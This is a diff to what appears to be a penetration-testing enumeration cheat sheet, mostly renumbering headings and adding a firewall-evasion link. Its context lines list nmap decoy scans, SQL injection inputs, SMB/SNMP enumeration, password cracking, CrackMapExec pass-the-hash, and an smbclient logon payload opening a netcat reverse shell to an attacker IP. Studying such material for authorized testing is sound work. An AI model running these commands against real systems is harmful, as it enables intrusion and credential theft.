@@ -19,6 +19,8 @@ Enumeration Roadmap
    
 * nmap -sU -sV -Pn -T4 -D <FAKE_IP_ADDRESS> <TARGET>     (UDP Decoy)
 
+* refer to https://nmap.org/book/man-bypass-firewalls-ids.html in order to evade firewall.
+
 
 
 **2. Nmap version and vulnerability Scan**
@@ -45,8 +47,8 @@ http://www.securityfocus.com/vulnerabilities
 
 Copy exploit to local dir: searchsploit -m <ID>
 
-* Manual Poking for Web Pages
-
+**5. Manual Poking for Web Pages**
+----------------------------------------------------------------------------------------------------------------------
 Check the Page Source, Inspect elements, view cookies, tamper data, use curl/wget
 
     Google alien terms!
@@ -70,7 +72,7 @@ Check for Input Validation in forms (like: 1′ or 1=1 limit 1;#   AND   1′ or
     ../
         Directory Traversal Vulnerabilities.
 
-**5. Are there any NETBIOS, SMB, RPC ports discovered from Step 1?**
+**6. Are there any NETBIOS, SMB, RPC ports discovered from Step 1?**
 ----------------------------------------------------------------------------------------------------------------------
 enum4linux -a <ip address>
 
@@ -100,8 +102,8 @@ Net view \\<ip-address>
 
 Check NMAP Scripts for SMB, DCERPC and NETBIOS
 
-* Any SMTP ports available?
-
+**7. Any SMTP ports available?**
+----------------------------------------------------------------------------------------------------------------------
 Enumerate Users:
 
 Mail Server Testing
@@ -110,8 +112,8 @@ Mail Server Testing
         VRFY username (verifies if username exists – enumeration of accounts)
         EXPN username (verifies if username is valid – enumeration of accounts)
 
-* How about SNMP ports?
-
+**8. How about SNMP ports?**
+----------------------------------------------------------------------------------------------------------------------
 Default Community Names: public, private, cisco, manager
 
 Enumerate MIB:
@@ -140,16 +142,16 @@ Eg: enumerating running processes:
 
 root@kali:~# snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2
 
-* FTP Ports Discovered
-
+**9. FTP Ports Discovered**
+----------------------------------------------------------------------------------------------------------------------
 Is anonymous login allowed?
 
 If yes, is directory listing possible? Can a file be ‘get’ or ‘send’?
 
 Use browser: ftp://<ip-address> , What do you find?
 
-* Password Cracking / Brute Forcing
-
+**10. Password Cracking / Brute Forcing**
+----------------------------------------------------------------------------------------------------------------------
 Try this as the last resort or in case the Passwd/Shadow/SAM files are in possession:
 
 For linux, first combine passwd & shadow files:  unshadow [passwd-file] [shadow-file] > unshadowed.txt
@@ -170,12 +172,15 @@ For WordPress MD5 with salt: hashcat -m 400 -a 0 <hash file> <wordlist file>
 
 Sample Password list: /usr/share/wordlist/rockyou.txt
 
-* Packet Sniffing
-
+**11. Packet Sniffing**
+----------------------------------------------------------------------------------------------------------------------
 Use Wireshark / tcpdump to capture traffic on the target host:
 
 “tcpdump -i tap0  host <target-ip> tcp port 80 and not arp and not icmp -vv”
 
+----------------------------------------------------------------------------------------------------------------------
+**More**
+----------------------------------------------------------------------------------------------------------------------
 *CME
 crackmapexec smb <TARGET/S> -u <LOCAL_USER_NAME> -H <XXX_LMHASH_XX>:<XXX_NTHASH_000> --local (PTH local creds) 
 crackmapexec smb <TARGET/S> -u '' -p '' (NULL Sessions)
@@ -200,6 +205,7 @@ smb: \> logon "/='nc <ATTACKERS_IP> <ATTACKERS_PORT> -e /bin/bash'"
 ip -4 addr show scope global    /*Determine interfaces ip address + prefix*/
 ip route show | grep default    /*Determine which interface is public*/
 -----------------------------------------------------------------------------------------------------
+
 In order to get multiple session on a single multi/handler, 
 you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. 
 For example, for shell/reverse_tcp payload,
